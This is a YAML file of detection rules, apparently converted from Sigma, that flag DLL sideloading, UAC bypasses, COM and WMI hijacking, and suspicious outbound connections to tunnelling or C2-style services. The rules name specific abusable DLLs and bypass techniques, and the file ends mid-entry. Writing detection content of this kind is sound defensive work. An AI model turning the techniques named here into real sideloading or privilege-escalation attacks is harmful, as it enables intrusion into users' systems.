- id: sigma_1fbc0671_5596_4e17_8682_f020a0b995dc
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "CCleanerDU.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - ccleanerdu
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3735d5ac_d770_4da0_99ff_156b180bc600
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "CCleanerReactivator.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - ccleanerreactivator
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_72ca7c75_bf85_45cd_aca7_255d360e423c
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "chrome_frame_helper.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - chrome
      - frame
      - helper
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_caa02837_f659_466f_bca6_48bde2826ab4
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading using ClassicExplorer32.dll from
    the Classic Shell software
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - classicexplorer32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6360757a_d460_456c_8b13_74cf0e60cceb
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading using comctl32.dll to obtain system
    privileges
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - comctl32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0fa66f66_e3f6_4a9c_93f8_4f2610b00171
  intent: defense_evasion
  tactic: defense_evasion
  description: Detect usage of the "coregen.exe" (Microsoft CoreCLR Native Image Generator)
    binary to sideload arbitrary DLLs.
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - using
      - coregen
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2b140a5c_dc02_4bb8_b6b1_8bdb45714cde
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects image load events of system control panel items (.cpl) from
    uncommon or non-system locations which might be the result of sideloading.
  conditions:
    summary:
      regex_any:
      - system
      - control
      - panel
      - item
      - loaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ca2bf31_0570_44d8_a543_534c47c33ed7
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects DLL sideloading of "dbgcore.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - dbgcore
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6414b5cd_b19d_447e_bb5e_9f03940b5784
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "dbghelp.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - dbghelp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fef394cd_f44d_4040_9b18_95d92fe278c0
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential DLL sideloading of "DbgModel.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - dbgmodel
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_edd3ddc3_386f_4ba5_9ada_4376b2cfa7b5
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "EACore.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - eacore
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e4903324_1a10_4ed3_981b_f6fe3be3a2c2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "edputil.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - edputil
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4fc0deee_0057_4998_ab31_d24e46e0aba4
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects DLL sideloading of DLLs usually located in system locations
    (System32, SysWOW64, etc.).
  conditions:
    summary:
      regex_any:
      - potential
      - system
      - sideloading
      - from
      - system
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6188d2f_b3c4_4d2c_a17d_9706e0851af0
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "goopdate.dll", a DLL used by
    googleupdate.exe
  conditions:
    summary:
      regex_any:
      - potential
      - goopdate
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e49b5745_1064_4ac1_9a2e_f687bc2dd37e
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "libcurl.dll" by the "gup.exe"
    process from an uncommon location
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - libcurl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4c21b805_4dd7_469f_b47d_7383a8fcb437
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "iviewers.dll" (OLE/COM Object
    Interface Viewer)
  conditions:
    summary:
      regex_any:
      - potential
      - iviewers
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7a3b6d1f_4a2b_4f8c_9d7e_e9f8cbf21a35
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects potential DLL side-loading of jli.dll.

    JLI.dll has been observed being side-loaded by Java processes by various threat
    actors, including APT41, XWorm,

    and others in order to load malicious payloads in context of legitimate Java processes.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - side
      - loading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_68654bf0_4412_43d5_bfe8_5eaa393cd939
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading using JUSTSYSTEMS Japanese word processor
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - jsschhlp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d2451be2_b582_4e15_8701_4196ac180260
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects potential DLL side loading of "KeyScramblerIE.dll" by "KeyScrambler.exe".

    Various threat actors and malware have been found side loading a masqueraded "KeyScramblerIE.dll"
    through "KeyScrambler.exe".

    '
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - keyscramblerie
      - keyscrambler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bf9808c4_d24f_44a2_8398_b65227d406b6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "libvlc.dll", a DLL that is legitimately
    used by "VLC.exe"
  conditions:
    summary:
      regex_any:
      - potential
      - libvlc
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d2605a99_2218_4894_8fd3_2afb7946514d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "mfdetours.dll". While using "mftrace.exe"
    it can be abused to attach to an arbitrary process and force load any DLL named
    "mfdetours.dll" from the current directory of execution.
  conditions:
    summary:
      regex_any:
      - potential
      - mfdetours
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_948a0953_f287_4806_bbcb_3b2e396df89f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects DLL sideloading of unsigned "mfdetours.dll". Executing "mftrace.exe"
    can be abused to attach to an arbitrary process and force load any DLL named "mfdetours.dll"
    from the current directory of execution.
  conditions:
    summary:
      regex_any:
      - unsigned
      - mfdetours
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5ba243e5_8165_4cf7_8c69_e1d3669654c1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential DLL sideloading of "MpSvc.dll".
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - mpsvc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cdb15e19_c2d0_432a_928e_e49c8c60dcf2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential DLL sideloading of "mscorsvc.dll".
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - mscorsvc
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6b98b92b_4f00_4f62_b4fe_4d1920215771
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects DLL sideloading of system DLLs that are not present on the
    system by default (at least not in system directories).

    Usually this technique is used to achieve UAC bypass or privilege escalation.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - existent
      - dlls
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_829a3bdf_34da_4051_9cf4_8ed221a8ae4f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects DLL sideloading of DLLs that are part of Microsoft Office from
    non standard location
  conditions:
    summary:
      regex_any:
      - microsoft
      - office
      - sideload
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d36f7c12_14a3_4d48_b6b8_774b9c66f44d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential DLL sideloading of Python DLL files.
  conditions:
    summary:
      regex_any:
      - potential
      - python
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e78b74f_c762_4800_82ad_f66787f10c8a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of rcdll.dll
  conditions:
    summary:
      regex_any:
      - potential
      - rcdll
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_259dda31_b7a3_444f_b7d8_17f96e8a7d0d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects loading of "RjvPlatform.dll" by the "SystemResetPlatform.exe"
    binary which can be abused as a method of DLL side loading since the "$SysReset"
    directory isn't created by default.
  conditions:
    summary:
      regex_any:
      - potential
      - rjvplatform
      - sideloading
      - from
      - default
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0e0bc253_07ed_43f1_816d_e1b220fe8971
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "RjvPlatform.dll" by "SystemResetPlatform.exe"
    located in a non-default location.
  conditions:
    summary:
      regex_any:
      - potential
      - rjvplatform
      - sideloading
      - from
      - default
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f64c9b2d_b0ad_481d_9d03_7fc75020892a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "roboform.dll", a DLL used by
    RoboForm Password Manager
  conditions:
    summary:
      regex_any:
      - potential
      - roboform
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_844f8eb2_610b_42c8_89a4_47596e089663
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "ShellDispatch.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - shelldispatch
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee4c5d06_3abc_48cc_8885_77f1c20f4451
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects processes loading the non-existent DLL "ShellChromeAPI". One
    known example is the "DeviceEnroller" binary in combination with the "PhoneDeepLink"
    flag tries to load this DLL.

    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe
    using this parameter

    '
  conditions:
    summary:
      regex_any:
      - sideloading
      - shellchromeapi
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_24b6cf51_6122_469e_861a_22974e9c1e5b
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "SmadHook.dll", a DLL used by
    SmadAV antivirus
  conditions:
    summary:
      regex_any:
      - potential
      - smadhook
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a2edbce1_95c8_4291_8676_0d45146862b3
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "SolidPDFCreator.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - solidpdfcreator
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f9df325d_d7bc_4a32_8a1a_2cc61dcefc63
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects DLL sideloading of DLLs that are part of third party software
    (zoom, discord....etc)
  conditions:
    summary:
      regex_any:
      - third
      - party
      - software
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_828af599_4c53_4ed2_ba4a_a9f835c434ea
  intent: defense_evasion
  tactic: defense_evasion
  description: The Fax service attempts to load ualapi.dll, which is non-existent.
    An attacker can then (side)load their own malicious DLL using this service.
  conditions:
    summary:
      regex_any:
      - service
      - search
      - order
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2092cacb_d77b_4f98_ab0d_32b32f99a054
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "vivaldi_elf.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - vivaldi_elf
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_70e8e9b4_6a93_4cb7_8cde_da69502e7aff
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects DLL sideloading of VMGuestLib.dll by the WmiApSrv service.
  conditions:
    summary:
      regex_any:
      - vmguestlib
      - sideload
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_98ffaed4_aec2_4e04_9b07_31492fe68b3d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of a signed dbghelp.dll by the Sysinternals
    VMMap.
  conditions:
    summary:
      regex_any:
      - vmmap
      - signed
      - dbghelp
      - potential
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_273a8dd8_3742_4302_bcc7_7df5a80fe425
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of an unsigned dbghelp.dll by the
    Sysinternals VMMap.
  conditions:
    summary:
      regex_any:
      - vmmap
      - unsigned
      - dbghelp
      - potential
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9313dc13_d04c_46d8_af4a_a930cc55d93b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects loading of a DLL by the VMware Xfer utility from the non-default
    directory which may be an attempt to sideload arbitrary DLL
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - vmware
      - xfer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_71b31e99_9ad0_47d4_aeb5_c0ca3928eeeb
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "waveedit.dll", which is part
    of the Nero WaveEditor audio editing software.
  conditions:
    summary:
      regex_any:
      - potential
      - waveedit
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db77ce78_7e28_4188_9337_cf30e2b3ba9f
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL side loading of DLLs that are part of the Wazuh
    security platform
  conditions:
    summary:
      regex_any:
      - potential
      - wazuh
      - security
      - platform
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_418dc89a_9808_4b87_b1d7_e5ae0cb6effc
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potential sideloading of "mpclient.dll" by Windows Defender
    processes ("MpCmdRun" and "NisSrv") from their non-default directory.
  conditions:
    summary:
      regex_any:
      - potential
      - mpclient
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e2e01011_5910_4267_9c3b_4149ed5479cf
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "wwlib.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - wwlib
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6e8fe0a8_ba0b_4a93_8f9e_82657e7a5984
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects BitLocker Access Agent Update Utility (baaupdate.exe) loading
    DLLs from suspicious locations that are publicly writable which could indicate
    an attempt to lateral movement via BitLocker DCOM & COM Hijacking.

    This technique abuses COM Classes configured as INTERACTIVE USER to spawn processes
    in the context of the logged-on user''s session. Specifically, it targets the
    BDEUILauncher Class (CLSID ab93b6f1-be76-4185-a488-a9001b105b94)

    which can launch BaaUpdate.exe, which is vulnerable to COM Hijacking when started
    with input parameters. This allows attackers to execute code in the user''s context
    without needing to steal credentials or use additional techniques to compromise
    the account.

    '
  conditions:
    summary:
      regex_any:
      - baaupdate
      - suspicious
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_060d5ad4_3153_47bb_8382_43e5e29eda92
  intent: persistence_installation
  tactic: persistence
  description: Detects unsigned module load by ClickOnce application.
  conditions:
    summary:
      regex_any:
      - unsigned
      - module
      - loaded
      - clickonce
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e9a9002_56c4_40fd_9eff_e4b09bfa5f6c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects when a system process (i.e. located in system32, syswow64,
    etc.) loads a DLL from a suspicious location or a location with permissive permissions
    such as "C:\Users\Public"
  conditions:
    summary:
      regex_any:
      - load
      - system
      - process
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4508a70e_97ef_4300_b62b_ff27992990ea
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects .NET CLR DLLs being loaded by scripting applications such as
    wscript or cscript. This could be an indication of potential suspicious execution.
  conditions:
    summary:
      regex_any:
      - dotnet
      - loaded
      - scripting
      - applications
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b5de0c9a_6f19_43e0_af4e_55ad01f550af
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects windows utilities loading an unsigned or untrusted DLL.

    Adversaries often abuse those programs to proxy execution of malicious code.

    '
  conditions:
    summary:
      regex_any:
      - unsigned
      - loaded
      - windows
      - utility
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ea5c131b_380d_49f9_aeb3_920694da4d4b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects loading and execution of an unsigned thor scanner binary.
  conditions:
    summary:
      regex_any:
      - suspicious
      - unsigned
      - thor
      - scanner
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ed5959a_c43c_4c59_84e3_d28628429456
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the "iscsicpl.exe" UAC bypass technique that leverages a DLL
    Search Order hijacking technique to load a custom DLL's from temp or a any user
    controlled location in the users %PATH%
  conditions:
    summary:
      regex_any:
      - bypass
      - using
      - iscsicpl
      - imageload
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a5ea83a7_05a5_44c1_be2e_addccbbd8c03
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Attempts to load dismcore.dll after dropping it
  conditions:
    summary:
      regex_any:
      - bypass
      - with
      - fake
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a9c73e8b_3b2d_4c45_8ef2_5f9a9c9998ad
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when the Microsoft Management Console (MMC) loads the DLL
    libraries like vbscript, jscript etc which might indicate an attempt

    to execute malicious scripts within a trusted system process for bypassing application
    whitelisting or defense evasion.

    '
  conditions:
    summary:
      regex_any:
      - loading
      - script
      - engines
      - dlls
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0cbe38c0_270c_41d9_ab79_6e5a9a669290
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects DLLs loading from a spoofed Windows directory path with an
    extra space (e.g "C:\Windows \System32") which can bypass Windows trusted path
    verification.

    This technique tricks Windows into treating the path as trusted, allowing malicious
    DLLs to load with high integrity privileges bypassing UAC.

    '
  conditions:
    summary:
      regex_any:
      - trusted
      - path
      - bypass
      - windows
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_06ce37c2_61ab_4f05_9ff5_b1a96d18ae32
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects threat actors proxy executing code and bypassing application
    controls by leveraging wmic and the `/FORMAT` argument switch to download and
    execute an XSL file (i.e js, vbs, etc).
  conditions:
    summary:
      regex_any:
      - wmic
      - loading
      - scripting
      - libraries
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7707a579_e0d8_4886_a853_ce47e4575aaa
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects a threat actor creating a file named `wbemcomn.dll` in the
    `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI
    DLL Hijack scenario.
  conditions:
    summary:
      regex_any:
      - wmiprvse
      - wbemcomn
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05936ce2_ee05_4dae_9d03_9a391cf2d2c6
  intent: persistence_installation
  tactic: persistence
  description: Detects WMI command line event consumers
  conditions:
    summary:
      regex_any:
      - persistence
      - command
      - line
      - event
      - consumer
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ad1f4bb9_8dfb_4765_adb6_2a7cfb6c0f94
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects signs of potential use of the WSMAN provider from uncommon
    processes locally and remote execution.
  conditions:
    summary:
      regex_any:
      - suspicious
      - wsman
      - provider
      - image
      - loads
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5205613d_2a63_4412_a895_3a2458b587b3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a network connection initiated by the Add-In deployment cache
    updating utility "AddInutil.exe".

    This could indicate a potential command and control communication as this tool
    doesn''t usually initiate network activity.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - addinutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b3ad3c0f_c949_47a1_a30e_b0491ccae876
  intent: reconnaissance
  tactic: discovery
  description: 'Detects uncommon network connections to the Active Directory Web Services
    (ADWS) from processes not typically associated with ADWS management.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - connection
      - active
      - directory
      - services
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0dba975d_a193_4ed1_a067_424df57570d1
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a network connection initiated by the certutil.exe utility.

    Attackers can abuse the utility in order to download malware or additional payloads.

    '
  conditions:
    summary:
      regex_any:
      - uncommon
      - network
      - connection
      - initiated
      - certutil
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_efafe0bf_4238_479e_af8f_797bd3490d2d
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a network connection initiated by Cmstp.EXE

    Its uncommon for "cmstp.exe" to initiate an outbound network connection. Investigate
    the source of such requests to determine if they are malicious.

    '
  conditions:
    summary:
      regex_any:
      - outbound
      - network
      - connection
      - initiated
      - cmstp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_37e4024a_6c80_4d8f_b95d_2e7e94f3a8d1
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects outbound network connection initiated by Microsoft Dialer.

    The Microsoft Dialer, also known as Phone Dialer, is a built-in utility application
    included in various versions of the Microsoft Windows operating system. Its primary
    function is to provide users with a graphical interface for managing phone calls
    via a modem or a phone line connected to the computer.

    This is an outdated process in the current conext of it''s usage and is a common
    target for info stealers for process injection, and is used to make C2 connections,
    common example is "Rhadamanthys"

    '
  conditions:
    summary:
      regex_any:
      - outbound
      - network
      - connection
      - initiated
      - microsoft
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5c80b618_0dbb_46e6_acbb_03d90bcb6d83
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects an initiated network connection by a non browser process on
    the system to "azurewebsites.net". The latter was often used by threat actors
    as a malware hosting and exfiltration site.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - azurewebsites
      - browser
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e02c8ec_02b9_43e8_81eb_34a475ba7965
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects network connections to BTunnels domains initiated by a process
    on the system.

    Attackers can abuse that feature to establish a reverse shell or persistence on
    a machine.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - btunnels
      - domains
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7cd1dcdc_6edf_4896_86dc_d1f19ad64903
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects network connections to Cloudflared tunnels domains initiated
    by a process on the system.

    Attackers can abuse that feature to establish a reverse shell or persistence on
    a machine.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - cloudflared
      - tunnels
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa5b1358_b040_4403_9868_15f7d9ab6329
  intent: impact_operations
  tactic: impact
  description: Detects initiated network connections to crypto mining pools
  conditions:
    summary:
      regex_any:
      - network
      - communication
      - with
      - crypto
      - mining
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_297ae038_edc2_4b2e_bb3e_7c5fc94dd5c7
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects an executable, which is not an internet browser or known application,
    initiating network connections to legit popular websites, which were seen to be
    used as dead drop resolvers in previous attacks.

    In this context attackers leverage known websites such as "facebook", "youtube",
    etc. In order to pass through undetected.

    '
  conditions:
    summary:
      regex_any:
      - connection
      - initiated
      - potential
      - dead
      - drop
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9501f8e6_8e3d_48fc_a8a6_1089dd5d7ef4
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects network connections to Devtunnels domains initiated by a process
    on a system. Attackers can abuse that feature to establish a reverse shell or
    persistence on a machine.

    '
  conditions:
    summary:
      regex_any:
      - network
      - connection
      - initiated
      - devtunnels
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_25eabf56_22f0_4915_a1ed_056b8dae0a68
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects an executable that isn't dropbox but communicates with the
    Dropbox API
  conditions:
    summary:
      regex_any:
      - suspicious
      - dropbox
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_edf3485d_dac4_4d50_90e4_b0e5813f7e60
  intent: reconnaissance
  tactic: discovery
  description: Detects external IP address lookups by non-browser processes via services
    such as "api.ipify.org". This could be indicative of potential post compromise
    internet test activity.
  conditions:
    summary:
      regex_any:
      - suspicious
      - network
      - connection
      - lookup
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7e9cf7b6_e827_11ed_a05b_0242ac120003
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a non-browser process interacting with the Google API which
    could indicate the use of a covert C2 such as Google Sheet C2 (GC2-sheet)

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - browser
      - network
      - communication
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ab65069_d82a_4d44_a759_466661a082d1
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects an executable initiating a network connection to "LocaltoNet"
    tunneling sub-domains.

    LocaltoNet is a reverse proxy that enables localhost services to be exposed to
    the Internet.

    Attackers have been seen to use this service for command-and-control activities
    to bypass MFA and perimeter controls.

    '
  conditions:
    summary:
      regex_any:
      - communication
      - localtonet
      - tunneling
      - service
      - initiated
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_18249279_932f_45e2_b37a_8925f2597670
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects an executable initiating a network connection to "ngrok" domains.

